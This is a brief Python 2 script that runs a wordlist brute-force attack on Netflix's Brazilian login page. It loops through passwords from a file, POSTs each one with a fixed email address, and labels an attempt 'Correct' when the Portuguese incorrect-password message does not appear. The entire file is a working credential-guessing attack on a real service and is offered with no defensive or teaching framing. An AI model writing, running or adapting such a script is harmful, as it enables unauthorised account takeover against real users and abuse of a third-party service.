import httplib
import urllib
import requests
# -*- encoding: utf-8 -*-


infile = open('wordlist.txt', 'r')
user = 'email'
host = 'www.netflix.com'
path = '/br/login'
print ("Target : "+host+path)

for line in infile:
	password=line.rstrip('\n')
	param = urllib.urlencode({'submit':'submit','email':user,'password':password})
	header = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	connect = httplib.HTTPConnection(host, 80)
	connect.request('POST', path, param, header)
	response = connect.getresponse()
	print(response.status),
	print ("--> "+user+":"+password),
	code = response.read()
	if code.find("Senha incorreta. Tente novamente ou redefina sua senha.") >= 0:
		print(chr(27)+"[0;91m"+"Incorrect")
	else:
		print (chr(27)+"[0;92m"+"Correct")
	print (chr(27)+"[0m")
	connect.close()
infile.close()